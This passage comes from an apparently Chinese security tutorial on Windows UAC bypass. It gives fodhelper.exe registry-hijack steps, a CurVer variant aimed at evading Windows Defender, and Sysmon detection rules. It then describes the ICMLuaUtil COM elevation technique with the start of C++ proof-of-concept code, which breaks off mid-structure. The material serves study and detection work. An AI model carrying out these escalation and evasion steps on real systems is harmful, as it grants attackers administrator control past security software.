<p><code>fodhelper.exe</code> 在运行时会查询当前用户注册表（HKCU）下的特定键值来决定如何启动子进程。可以通过修改这些键值，让 <code>fodhelper.exe</code>以管理员权限启动恶意程序。</p>
<ul>
<li>在 <code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code> 下创建键值。</li>
<li>新建一个名为 <code>DelegateExecute</code> 的键，值设为空（这会迫使程序去读取默认键值）。</li>
<li>修改 <code>(Default)</code>键的值为恶意程序路径（例如 <code>C:\windows\system32\cmd.exe</code>）。</li>
<li>运行 <code>fodhelper.exe</code>。它会读取上述注册表，进而以高权限启动 <code>cmd.exe</code>。</li>
</ul>
<p>Windows Defender 会监控 <code>ms-settings</code> 键值的修改并查杀进程。可以利用一个变种思路：</p>
<ul>
<li><code>fodhelper.exe</code> 还会查询 <code>HKCU\Software\Classes\ms-settings\CurVer</code>。</li>
<li>修改 <code>CurVer</code> 的值指向一个自定义名称（如 <code>.pwn</code>），然后将 Payload 写入到这个自定义名称的注册表路径下（如 <code>HKCU\Software\Classes\.pwn\Shell\Open\command</code>）。</li>
<li>试图通过重定向注册表查询路径，绕过杀软对标准路径 <code>ms-settings</code>的静态监控（目前依然会杀）。</li>
</ul>
<h6 id="检测方法-1"><a href="#检测方法-1" class="headerlink" title="检测方法"></a>检测方法</h6><p>监控 <code>HKCU\Software\Classes\ms-settings\Shell\Open\command\(default)</code> 的修改。</p>
<p>监控 <code>HKCU\Software\Classes\ms-settings\CurVer\(default)</code> 的修改。</p>
<p>将下面的规则添加到sysmon配置文件的 <code>&lt;EventFiltering&gt;</code>中</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Sysmon</span> <span class="attr">schemaversion</span>=<span class="string">&quot;4.82&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">EventFiltering</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">RuleGroup</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">groupRelation</span>=<span class="string">&quot;or&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">RegistryEvent</span> <span class="attr">onmatch</span>=<span class="string">&quot;include&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TargetObject</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span>\Software\Classes\ms-settings\Shell\Open\command<span class="tag">&lt;/<span class="name">TargetObject</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TargetObject</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span>\Software\Classes\ms-settings\CurVer<span class="tag">&lt;/<span class="name">TargetObject</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">RegistryEvent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">RuleGroup</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">RuleGroup</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">groupRelation</span>=<span class="string">&quot;or&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">RegistryValueSet</span> <span class="attr">onmatch</span>=<span class="string">&quot;include&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TargetObject</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span>\Software\Classes\ms-settings\Shell\Open\command\(Default)<span class="tag">&lt;/<span class="name">TargetObject</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TargetObject</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span>\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute<span class="tag">&lt;/<span class="name">TargetObject</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">TargetObject</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span>\Software\Classes\ms-settings\CurVer\(Default)<span class="tag">&lt;/<span class="name">TargetObject</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">RegistryValueSet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">RuleGroup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">EventFiltering</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Sysmon</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="com组件ICMLuaUtil提权"><a href="#com组件ICMLuaUtil提权" class="headerlink" title="com组件ICMLuaUtil提权"></a>com组件ICMLuaUtil提权</h5><h6 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h6><p><code>CMSTPLUA</code> 是一个未文档化的 COM 组件（CLSID: <code>{3E5FC7F9-9A51-4367-9063-A120244FBEC7}</code>），通常用于应用程序兼容性管理。该组件实现了 <code>ICMLuaUtil</code> 接口，其中包含一个 <code>ShellExec</code> 方法。这个方法允许执行外部程序。如果我们可以使用高权限ICMLuaUtil组件接口调用ShellExec运行特定的程序，那么我们就能获得管理员权限。</p>
<p>可以远程dll注入到微软定义的合法进程explorer.exe等，或者通过修改PEB进行进程伪装。</p>
<p>代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;objbase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;strsafe.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Shobjidl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdll.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ole32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;oleaut32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;user32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLSID_CMSTPLUA <span class="string">L&quot;&#123;3E5FC7F9-9A51-4367-9063-A120244FBEC7&#125;&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IID_ICMLuaUtil <span class="string">L&quot;&#123;6EDD6D74-C007-4E75-B76A-E5740995E24C&#125;&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RTL_MAX_DRIVE_LETTERS 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_HANDLE_BUFFER_SIZE32 34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_HANDLE_BUFFER_SIZE64 60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_BATCH_BUFFER_SIZE 310</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NT_SUCCESS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined(_M_X64)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_HANDLE_BUFFER_SIZE GDI_HANDLE_BUFFER_SIZE32</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_HANDLE_BUFFER_SIZE GDI_HANDLE_BUFFER_SIZE64</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> interface ICMLuaUtil ICMLuaUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ICMLuaUtilVtbl</span> &#123;</span><br><span class="line">    <span class="function">BEGIN_INTERFACE</span></span><br><span class="line"><span class="function">    <span class="title">HRESULT</span><span class="params">(STDMETHODCALLTYPE* QueryInterface)</span><span class="params">(__RPC__in ICMLuaUtil* This, __RPC__in REFIID riid, _COM_Outptr_ <span class="type">void</span>** ppvObject)</span></span>;</span><br><span class="line">    <span class="built_in">ULONG</span>(STDMETHODCALLTYPE* AddRef)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">ULONG</span>(STDMETHODCALLTYPE* Release)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method1)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method2)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method3)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method4)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method5)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method6)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* ShellExec)(__RPC__in ICMLuaUtil* This, _In_ LPCWSTR lpFile, _In_opt_ LPCTSTR lpParameters, _In_opt_ LPCTSTR lpDirectory, _In_ ULONG fMask, _In_ ULONG nShow);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* SetRegistryStringValue)(__RPC__in ICMLuaUtil* This, _In_ HKEY hKey, _In_opt_ LPCTSTR lpSubKey, _In_opt_ LPCTSTR lpValueName, _In_ LPCTSTR lpValueString);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method9)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method10)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method11)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method12)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method13)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method14)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method15)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method16)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method17)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method18)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method19)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method20)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    END_INTERFACE</span><br><span class="line">&#125; *PICMLuaUtilVtbl;</span><br><span class="line"></span><br><span class="line">interface ICMLuaUtil &#123;</span><br><span class="line">    CONST_VTBL <span class="keyword">struct</span> <span class="title class_">ICMLuaUtilVtbl</span>* lpVtbl;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> ULONG GDI_HANDLE_BUFFER32[GDI_HANDLE_BUFFER_SIZE32];</span><br><span class="line"><span class="keyword">typedef</span> ULONG GDI_HANDLE_BUFFER64[GDI_HANDLE_BUFFER_SIZE64];</span><br><span class="line"><span class="keyword">typedef</span> ULONG GDI_HANDLE_BUFFER[GDI_HANDLE_BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> &#123;</span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING, *PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_STRING</span> &#123;</span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PCHAR Buffer;</span><br><span class="line">&#125; STRING, *PSTRING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CLIENT_ID</span> &#123;</span><br><span class="line">    HANDLE UniqueProcess;</span><br><span class="line">    HANDLE UniqueThread;</span><br><span class="line">&#125; CLIENT_ID, *PCLIENT_ID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_DATA_TABLE_ENTRY_COMPATIBLE</span> &#123;</span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">        LIST_ENTRY InProgressLinks;</span><br><span class="line">    &#125; DUMMYUNION0;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line">    UNICODE_STRING BaseDllName;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        ULONG Flags;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            ULONG PackagedBinary : <span class="number">1</span>;</span><br><span class="line">            ULONG MarkedForRemoval : <span class="number">1</span>;</span><br><span class="line">            ULONG ImageDll : <span class="number">1</span>;</span><br><span class="line">            ULONG LoadNotificationsSent : <span class="number">1</span>;</span><br><span class="line">            ULONG TelemetryEntryProcessed : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessStaticImport : <span class="number">1</span>;</span><br><span class="line">            ULONG InLegacyLists : <span class="number">1</span>;</span><br><span class="line">            ULONG InIndexes : <span class="number">1</span>;</span><br><span class="line">            ULONG ShimDll : <span class="number">1</span>;</span><br><span class="line">            ULONG InExceptionTable : <span class="number">1</span>;</span><br><span class="line">            ULONG ReservedFlags1 : <span class="number">2</span>;</span><br><span class="line">            ULONG LoadInProgress : <span class="number">1</span>;</span><br><span class="line">            ULONG LoadConfigProcessed : <span class="number">1</span>;</span><br><span class="line">            ULONG EntryProcessed : <span class="number">1</span>;</span><br><span class="line">            ULONG ProtectDelayLoad : <span class="number">1</span>;</span><br><span class="line">            ULONG ReservedFlags3 : <span class="number">2</span>;</span><br><span class="line">            ULONG DontCallForThreads : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessAttachCalled : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessAttachFailed : <span class="number">1</span>;</span><br><span class="line">            ULONG CorDeferredValidate : <span class="number">1</span>;</span><br><span class="line">            ULONG CorImage : <span class="number">1</span>;</span><br><span class="line">            ULONG DontRelocate : <span class="number">1</span>;</span><br><span class="line">            ULONG CorILOnly : <span class="number">1</span>;</span><br><span class="line">            ULONG ChpeImage : <span class="number">1</span>;</span><br><span class="line">            ULONG ReservedFlags5 : <span class="number">2</span>;</span><br><span class="line">            ULONG Redirected : <span class="number">1</span>;</span><br><span class="line">            ULONG ReservedFlags6 : <span class="number">2</span>;</span><br><span class="line">            ULONG CompatDatabaseProcessed : <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; ENTRYFLAGSUNION;</span><br><span class="line">    WORD ObsoleteLoadCount;</span><br><span class="line">    WORD TlsIndex;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; DUMMYUNION1;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        ULONG TimeDateStamp;</span><br><span class="line">        PVOID LoadedImports;</span><br><span class="line">    &#125; DUMMYUNION2;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY_COMPATIBLE, *PLDR_DATA_TABLE_ENTRY_COMPATIBLE, LDR_DATA_TABLE_ENTRY, *PCLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB_LDR_DATA</span> &#123;</span><br><span class="line">    ULONG Length;</span><br><span class="line">    